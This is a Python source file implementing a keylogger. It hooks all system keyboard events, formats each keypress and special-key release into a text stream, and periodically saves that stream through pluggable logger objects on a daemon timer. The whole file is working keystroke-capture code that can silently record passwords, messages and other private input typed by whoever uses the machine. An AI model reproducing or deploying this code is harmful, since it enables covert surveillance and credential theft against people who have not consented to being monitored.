import keyboard
from threading import Timer
import keylogger_logger

class Keylogger:
    def __init__(self):
        self.loggers = []

        keyboard.hook(callback=self._log_event)

    def __del__(self):
        for logger in self.loggers:
            logger.save()

    def add_logger(self, logger: keylogger_logger._AbstractLogger):
        self.loggers.append(logger)
        return self

    def save_each(self, seconds):
        for logger in self.loggers:
            logger.save()

        timer = Timer(interval=seconds, function=self.save_each, args=[[seconds]])
        timer.daemon = True     # set the thread as daemon (dies when main thread dies)
        timer.start()

        return self

    def _log(self, key: str):
        for logger in self.loggers:
            logger.log(key)

    def _log_event(self, event: keyboard.KeyboardEvent):
        if event.event_type == 'down':
            self._log_keypress(event)
        else:
            self._log_keyrelease(event)

    def _log_keypress(self, event):
        name = event.name
        
        # regular character
        if len(name) == 1:
            self._log(name)
            return

        # not a character, special key (e.g ctrl, alt, etc.)
        if name == 'space':
            # ' ' instead of 'space'
            self._log(' ')
        elif name == 'enter':
            # add a new line whenever an ENTER is pressed
            self._log('[ENTER]\n')
        elif name == 'decimal':
            self._log('.')
        else:
            # replace spaces with underscores
            self._log('[{}]'.format(name.replace(' ', '_').upper()))

    def _log_keyrelease(self, event):
        name = event.name

        # skip regular letters
        if len(name) == 1:
            return
        if name in ['space', 'enter']:
            return

        self._log('[{}-RELEASE]'.format(name.replace(' ', '_').upper()))

    def wait(self):
        keyboard.wait()